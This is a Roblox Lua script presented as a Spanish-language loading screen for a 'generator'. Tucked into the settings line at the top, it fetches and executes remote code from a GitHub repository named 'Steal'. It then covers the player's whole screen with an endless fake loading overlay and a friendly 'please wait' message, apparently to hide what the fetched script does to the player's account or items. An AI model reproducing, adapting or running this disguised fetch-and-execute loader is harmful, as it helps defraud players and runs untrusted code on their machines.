--settings:
loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptsop13/Steal/refs/heads/main/Jhonaiker.lua'))() title = "Cargando Generador" --upper title
local loading_text = "Porfavor espera" --gray title
local loadingtime = 50000000000 --loading time (in seconds)

--credits to arko2230 !
--do not touch/edit anything below! unless you know how to code ;)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PersistentLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999999999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Frame.BackgroundTransparency = 0.2
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)

local Frame_2 = Instance.new("Frame")
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Frame_2.Position = UDim2.new(0.3748, 0, 0.3706, 0)
Frame_2.Size = UDim2.new(0.2495, 0, 0.2574, 0)

local UICorner = Instance.new("UICorner")
UICorner.Parent = Frame_2

local name = Instance.new("TextLabel")
name.Parent = Frame_2
name.BackgroundTransparency = 1
name.Position = UDim2.new(0, 0, 0.0501, 0)
name.Size = UDim2.new(1, 0, 0.1642, 0)
name.Font = Enum.Font.FredokaOne
name.Text = title
name.TextColor3 = Color3.fromRGB(255, 255, 255)
name.TextScaled = true
name.TextWrapped = true

local loadingtext = Instance.new("TextLabel")
loadingtext.Parent = Frame_2
loadingtext.BackgroundTransparency = 1
loadingtext.Position = UDim2.new(0.161, 0, 0.2138, 0)
loadingtext.Size = UDim2.new(0.6774, 0, 0.1207, 0)
loadingtext.Font = Enum.Font.FredokaOne
loadingtext.Text = loading_text
loadingtext.TextColor3 = Color3.fromRGB(97, 97, 97)
loadingtext.TextScaled = true
loadingtext.TextWrapped = true

local Dots = Instance.new("Frame")
Dots.Name = "Dots"
Dots.Parent = Frame_2
Dots.BackgroundTransparency = 1
Dots.Position = UDim2.new(0.2932, 0, 0.5555, 0)
Dots.Size = UDim2.new(0.4167, 0, 0.2556, 0)

local function createDot(parent, position)
    local dot = Instance.new("Frame")
    dot.Parent = parent
    dot.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    dot.Position = position
    dot.Size = UDim2.new(0.1593, 0, 0.5116, 0)
    local uic = Instance.new("UICorner", dot)
    uic.CornerRadius = UDim.new(0.5, 0)

    local inside = Instance.new("Frame")
    inside.Name = "InsideDot"
    inside.Parent = dot
    inside.AnchorPoint = Vector2.new(0.5, 0.5)
    inside.Position = UDim2.new(0.5, 0, 0.5, 0)
    inside.Size = UDim2.new(0, 0, 0, 0)
    inside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", inside).CornerRadius = UDim.new(0.5, 0)

    return dot
end

local Dot1 = createDot(Dots, UDim2.new(0.061, 0, 0.2344, 0))
local Dot2 = createDot(Dots, UDim2.new(0.4199, 0, 0.2344, 0))
local Dot3 = createDot(Dots, UDim2.new(0.7788, 0, 0.2344, 0))

local seperator = Instance.new("Frame")
seperator.Parent = Frame_2
seperator.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
seperator.Position = UDim2.new(0, 0, 0.3651, 0)
seperator.Size = UDim2.new(1, 0, 0.0267, 0)

-- Dots animation loop
task.spawn(function()
    while true do
        task.wait(0.25)
        Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
        task.wait(0.25)
        Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
        task.wait(0.25)
        Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
        task.wait(0.25)
        Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
        task.wait(0.25)
        Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
        task.wait(0.25)
        Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
    end
end)

-- Show notification for 10 seconds
local notification = Instance.new("ScreenGui")
notification.Name = "LoadingNotification"
notification.ResetOnSpawn = false
notification.IgnoreGuiInset = true
notification.DisplayOrder = 999999999
pcall(function() notification.Parent = game:GetService("CoreGui") end)

local notifyFrame = Instance.new("Frame")
notifyFrame.Parent = notification
notifyFrame.AnchorPoint = Vector2.new(0.5, 0.5)
notifyFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
notifyFrame.BackgroundTransparency = 0.7
notifyFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
notifyFrame.Size = UDim2.new(0.5, 0, 0.15, 0)

local notifyLabel = Instance.new("TextLabel")
notifyLabel.Parent = notifyFrame
notifyLabel.BackgroundTransparency = 1
notifyLabel.Position = UDim2.new(0, 0, 0, 0)
notifyLabel.Size = UDim2.new(1, 0, 1, 0)
notifyLabel.Font = Enum.Font.FredokaOne
notifyLabel.Text = "Hola, porfavor espera que el script termine de cargar disfruta ✅ Feliz Pascua!"
notifyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
notifyLabel.TextScaled = true
notifyLabel.TextWrapped = true

task.wait(10) -- Show for 10 seconds
notification:Destroy()

-- Este wait es simbólico, puedes quitarlo si quieres que nunca desaparezca
-- task.delay(loadingtime, function()
--     Frame.Visible = false
-- end)
